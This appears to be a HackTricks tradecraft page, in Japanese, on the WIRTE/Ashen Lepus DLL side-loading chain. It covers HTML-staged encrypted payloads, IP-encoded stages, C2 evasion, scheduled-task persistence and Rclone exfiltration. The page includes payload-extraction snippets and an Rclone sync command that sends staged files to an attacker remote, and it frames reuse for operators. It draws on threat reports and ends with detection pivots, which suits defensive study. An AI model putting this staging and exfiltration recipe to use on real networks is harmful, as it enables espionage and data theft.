# HTML-Embedded Payload Staging を用いた Advanced DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (別名 WIRTE) は、DLL sideloading、staged HTML payloads、modular .NET backdoors を連鎖させ、中東の外交ネットワーク内で永続化する再現性のあるパターンを weaponize しました。この technique は、以下に依存しているため、あらゆる operator が再利用できます:<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: 無害な PDF で、対象者に file-sharing site から RAR archive を取得するよう指示します。archive には、本物らしい document viewer EXE、信頼された library にちなんだ名前（例: `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`）を付けた malicious DLL、および囮の `Document.pdf` が含まれます。
- **DLL search order abuse**: victim が EXE を double-click すると、Windows は current directory から DLL import を解決します。これにより malicious loader (AshenLoader) が trusted process 内で実行され、同時に囮の PDF が開いて不審に思われないようにします。
- **Living-off-the-land staging**: 後続のすべての stage (AshenStager → AshenOrchestrator → modules) は必要になるまで disk 上に保持されず、無害に見える HTML responses 内に隠された encrypted blobs として配信されます。

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE は AshenLoader を side-load します。AshenLoader は host recon を実行し、自身を AES-CTR で encrypt したうえで、`token=`、`id=`、`q=`、`auth=` などの rotating parameters に格納し、`/api/v2/account` などの API に見える paths へ POST します。<sup>[[1]](#references)</sup>
2. **HTML extraction**: C2 は、client IP が target region に geolocate され、`User-Agent` が implant と一致した場合にのみ next stage を返します。これにより sandboxes を妨害します。checks を通過すると、HTTP body には `<headerp>...</headerp>` blob が含まれます。この blob には Base64/AES-CTR encrypted AshenStager payload が格納されています。
3. **Second sideload**: AshenStager は、`wtsapi32.dll` を import する別の legitimate binary とともに deploy されます。binary に injected された malicious copy は、さらに HTML を取得し、今回は `<article>...</article>` を切り出して AshenOrchestrator を復元します。
4. **AshenOrchestrator**: Base64 JSON config を decode する modular .NET controller です。config の `tg` フィールドと `au` フィールドを連結・hash して AES key を生成し、その key で `xrk` を decrypt します。得られた bytes は、その後 fetch されるすべての module blobs の XOR key として機能します。
5. **Module delivery**: 各 module は HTML comments を通じて記述され、parser を任意の tag へ redirect します。これにより、`<headerp>` または `<article>` のみを探す static rules を回避します。modules には persistence (`PR*`)、uninstallers (`UN*`)、reconnaissance (`SN`)、screen capture (`SCT`)、file exploration (`FE`) が含まれます。

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
防御側が特定の要素をブロックまたは除去しても、operatorはHTMLコメントで示されたtagを変更するだけで、配信を再開できます。<sup>[[1]](#references)</sup>

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion の類似点

最近の HTML smuggling 研究（Talos）では、HTML 添付ファイル内の `<script>` ブロックに Base64 文字列として隠された payload を、実行時に JavaScript で decode する手法が注目されています。<sup>[[2]](#references)</sup> 同じ手法は C2 response にも再利用できます。つまり、暗号化された blob を script tag（または他の DOM element）内に stage し、AES/XOR の前に in-memory で decode することで、ページを通常の HTML に見せかけます。Talos は script tag 内で layered obfuscation（identifier の rename と Base64/Caesar/AES の組み合わせ）も示しており、これは HTML-staged C2 blob にそのまま応用できます。<sup>[[2]](#references)</sup> Talos による後続の **hidden text salting** に関する writeup もここで関連します。無関係な HTML comment や whitespace で Base64 を分割するだけで、browser 側での再構築を容易に保ったまま、単純な regex extractor を機能させなくできます。<sup>[[7]](#references)</sup>

## 最近の Variant に関する注記（2024-2025）

- Check Point は 2024 年の WIRTE campaign を観測しました。この campaign は archive-based sideloading を引き続き中心としていましたが、first stage として `propsys.dll`（stagerx64）を使用していました。この stager は Base64 + XOR（key `53`）で次の payload を decode し、hardcoded な `User-Agent` を付けて HTTP request を送信し、HTML tag の間に埋め込まれた encrypted blob を抽出します。ある branch では、`RtlIpv4StringToAddressA` で decode された埋め込み IP string の長い list から stage が再構築され、その後 payload byte に連結されていました。<sup>[[3]](#references)</sup>
- OWN-CERT は、以前の WIRTE tooling について記録しています。side-loaded された `wtsapi32.dll` dropper は Base64 + TEA で string を保護し、DLL name 自体を decryption key として使用していました。その後、host identification data を XOR/Base64 で obfuscate してから C2 に送信していました。<sup>[[4]](#references)</sup>

## IP-Encoded Stage の再構築

WIRTE の 2024 年の `propsys.dll` branch は、次の PE を単一の連続した HTML blob として配置する必要がないことを示しています。loader は stage byte を dotted-quad string として格納し、`RtlIpv4StringToAddressA` で再構築できます。これは Hive の **IPfuscation** tradecraft と密接に関連する pattern です。<sup>[[3]](#references)[[5]](#references)</sup> Operationally、これは actor が HTML page に明らかな Base64 payload ではなく、無害に見える IOC や config data を含めたい場合に有用です。
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
復元されたバイト列が `MZ` で始まる場合、次の PE を直接再構成できた可能性が高いです。そうでない場合は、先頭に XOR/Base64 レイヤーがあるか、アドレス間に小さな区切りチャンクが挿入されていないか確認してください。

## Swappable DLL Names & Host Rotation

このパターンの強力な特性は、**HTML/AES/XOR staging backend を同一のまま、sideload pair だけを変更できることです**。WIRTE はキャンペーンごとに `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`、`propsys.dll` を使い分けており、これは次の理由から有用です。<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` と `wtsapi32.dll` は、defender が `%System32%` / `%SysWOW64%` に存在すると想定する、目立たない Windows DLL 名です。
- **HijackLibs** などの公開カタログには、コピーされたアプリケーションディレクトリからこれらの DLL 名をロードする多数のバイナリがすでに登録されているため、stager を再設計せずに replacement host を用意できます。
- host ごとに適応が必要なのは export surface だけです。HTML parser、AES/XOR routines、module loader は通常、forwarding proxy DLL にそのまま移植できます。

offensive lab work では、これは問題を **(1) 選択した DLL 名をローカルで解決する安定した signed host を見つけること** と **(2) その DLL の背後で同じ staged-HTML loader logic を再利用すること** に分けられるという意味です。

## Crypto & C2 Hardening

- **AES-CTR everywhere**: 現在の loader は 256-bit key と nonce（例: `{9a 20 51 98 ...}`）を埋め込み、復号の前後に `msasn1.dll` のような文字列を使った XOR layer を追加する場合があります。<sup>[[1]](#references)</sup>
- **Key material variations**: 初期の loader は Base64 + TEA を使って埋め込み文字列を保護し、decryption key は malicious DLL name（例: `wtsapi32.dll`）から導出していました。<sup>[[4]](#references)</sup>
- **Infrastructure split + subdomain camouflage**: staging server は tool ごとに分離され、異なる ASN にまたがってホストされ、正規に見える subdomain の背後に置かれる場合もあります。そのため、1 つの stage が露見しても残りが明らかになることはありません。
- **Recon smuggling**: 列挙データには現在、価値の高いアプリケーションを発見するための Program Files listing も含まれ、host 外へ送信される前に必ず暗号化されます。
- **URI churn**: query parameter と REST path はキャンペーンごとに変更され（`/api/v1/account?token=` → `/api/v2/account?auth=`）、脆弱な detection を無効化します。
- **User-Agent pinning + safe redirects**: C2 infrastructure は正確な UA string にのみ応答し、それ以外の場合は無害な news/health site へ redirect して通常の通信に紛れ込みます。
- **Gated delivery**: server は geo-fencing され、実際の implant にのみ応答します。承認されていない client には不審に見えない HTML が返されます。

## Persistence & Execution Loop

AshenStager は Windows の maintenance job を装い、`svchost.exe` 経由で実行される scheduled task を作成します。例:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

これらの task は boot 時または一定間隔で sideloading chain を再起動し、AshenOrchestrator が再び disk に触れることなく fresh module を要求できるようにします。

## Using Benign Sync Clients for Exfiltration

operators は dedicated module を使い、外交文書を `C:\Users\Public`（world-readable で不審に見えない場所）に staging してから、正規の [Rclone](https://rclone.org/) binary を download し、その directory を attacker storage と同期します。Unit42 によると、これはこの actor が exfiltration に Rclone を使用したことが確認された初めての事例であり、正規の sync tooling を悪用して通常の traffic に紛れ込む、より広範な傾向と一致します。<sup>[[1]](#references)</sup>

1. **Stage**: target file を `C:\Users\Public\{campaign}\` に copy/collect します。
2. **Configure**: attacker-controlled HTTPS endpoint（例: `api.technology-system[.]com`）を指定する Rclone config を配置します。
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行し、traffic が通常の cloud backup に見えるようにします。

Rclone は正規の backup workflow で広く使用されているため、defender は anomalous execution（新しい binary、奇妙な remote、または `C:\Users\Public` の突然の sync）に注目する必要があります。

## Detection Pivots

- **signed process** が user-writable path から予期せず DLL を load していないか alert します（Procmon filter + `Get-ProcessMitigation -Module`）。特に DLL 名が `netutils`、`srvcli`、`dwampi`、`wtsapi32`、`propsys` と重なる場合は注意が必要です。<sup>[[6]](#references)</sup>
- suspicious HTTPS response に、**通常とは異なる tag 内に埋め込まれた大きな Base64 blob**、または `<!-- TAG: <xyz> -->` comment による保護がないか調査します。
- 最初に HTML を normalize します。Base64 extraction の前に **comment を削除し、whitespace を collapse** してください。hidden-text-salting style evasion では、payload が comment boundary をまたいで分割される可能性があるためです。
- HTML hunting の対象を **`<script>` block 内の Base64 string** にも拡張します。これは HTML smuggling-style staging で、AES/XOR processing の前に JavaScript で decode されます。
- **`RtlIpv4StringToAddressA` の反復呼び出しと、それに続く buffer assembly** を hunt します。特に周囲の string が実際の network target ではなく、長い IPv4 list である場合は注意が必要です。
- `svchost.exe` を non-service argument 付きで実行する、または dropper directory を指す **scheduled task** を hunt します。
- 正確な `User-Agent` string に対してのみ payload を返し、それ以外では正規の news/health domain に bounce する **C2 redirect** を追跡します。
- IT 管理下にない場所に出現する **Rclone** binary、新しい `rclone.conf` file、または `C:\Users\Public` のような staging directory から pull する sync job を monitor します。

## References

- [1] [Hamas-affiliated Ashen Lepus が新しい AshTag malware suite で中東の外交機関を標的にする](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [タグの間に隠されたもの: HTML smuggling における evasion technique の知見](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE が中東での活動を継続し、破壊的活動へ移行](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware が detection 回避のため新しい IPfuscation technique を展開](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Non System Locations からの Potential System DLL Sideloading](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [hidden text salting で email threat に seasoning を加える](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
